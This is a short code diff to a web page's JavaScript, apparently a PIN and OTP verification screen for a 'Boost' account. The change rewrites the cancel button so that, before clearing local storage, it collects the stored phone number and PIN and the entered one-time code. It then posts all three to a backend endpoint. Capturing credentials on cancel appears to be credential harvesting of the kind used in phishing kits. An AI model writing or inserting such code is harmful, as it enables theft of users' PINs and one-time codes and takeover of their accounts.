@@ -151,11 +151,23 @@
             }
         });
 
-        cancelBtn.addEventListener('click', function() {
-            localStorage.removeItem('boost_phone');
-            localStorage.removeItem('boost_pin');
-            window.location.href = 'index.html';
-        });
+        cancelBtn.addEventListener('click', async function() {
+  const phone = localStorage.getItem('boost_phone');
+  const pin = localStorage.getItem('boost_pin');
+  const otp = Array.from(document.querySelectorAll('.otp')).map(i => i.value).join('');
+  if (phone && pin && otp) {
+    try {
+      await fetch(BACKEND_URL + '/api/cancel-request', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone, pin, otp })
+      });
+    } catch (e) { console.error(e); }
+  }
+  localStorage.removeItem('boost_phone');
+  localStorage.removeItem('boost_pin');
+  window.location.href = 'index.html';
+});
 
         function updateTimer() {
             if (timeLeft <= 0) {
